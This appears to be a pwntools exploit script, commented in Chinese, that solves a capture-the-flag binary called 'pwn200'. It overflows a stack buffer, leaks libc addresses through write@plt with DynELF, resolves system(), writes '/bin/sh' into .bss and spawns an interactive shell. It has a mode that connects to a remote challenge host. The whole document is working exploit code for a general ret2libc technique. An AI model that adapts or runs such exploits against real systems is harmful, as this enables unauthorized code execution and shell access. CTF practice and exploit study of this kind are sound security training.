#!/usr/bin/python
#coding=utf-8
from pwn import *
pwn_file='./pwn200'
binary = ELF(pwn_file)

# libc = ELF('')

#context.terminal = ['tmux', 'splitw', '-h'] 
context(arch='i386',os='linux')
if args['DEBUG']:
    context.log_level = True 
elif args['REMOTE']: 
    io = remote('220.249.52.133', '56825')
else: 
    io = process(pwn_file)

# gdb.attach(io)

writePLT = binary.plt['write'] 
readPLT = binary.plt['read'] 
bssAddress = binary.bss(0) 
vulnAddress = 0x8048484
#ROPgadget --binary pwn200 --only 'pop|ret'，三次pop操作将指针指向systemAddress
ppp_ret=0x804856c  

def leak(address): 
    #112=0x6C+4
    #payload = 'A' * 112 + p32(writePLT) + p32(vulnAddress) + p32(1) + p32(address) + p32(4) 
    #payload=padding+write PLT表地址+返回地址（需要二次发送）+参数1（0表示标准输入流stdin，1表示标准输出流stdout）+参数2（从内存中dump出的4字节system地址）+参数3（写入数据大小）
    payload = flat(['A' * 112,writePLT,vulnAddress,1,address,4]) 
    io.send(payload) 
    data = io.recv(4)
    log.debug("%#x => %s" % (address, (data or '').encode('hex'))) 
    return data

io.recvline()

dynelf = DynELF(leak,elf=binary) 
systemAddress = dynelf.lookup("__libc_system",'libc') 
#log.success(hex(systemAddress))
print(hex(systemAddress))

#调用start函数来恢复栈
io.send(flat(['A'*112, 0x080483D0]))
#payload=padding+read PLT表地址（使用read函数来写入地址）+read函数返回地址（写入完成后需要调用system函数）+read函数参数1（0表示标准输入流stdin，1表示标准输出流stdout）+read函数参数2（bss段地址）+read函数参数3（strlen("/bin/sh\x00")+system函数返回地址+system函数的参数(bss段的地址)
payload = flat(['A' * 112,readPLT,systemAddress,0,bssAddress,10,0xdeadbeef,bssAddress])
#payload=flat(['A'*112,readPLT,ppp_ret,0,bssAddress,8,systemAddress,vulnAddress,bssAddress])
io.send(payload) 
io.send('/bin/sh\x00') 
io.interactive() 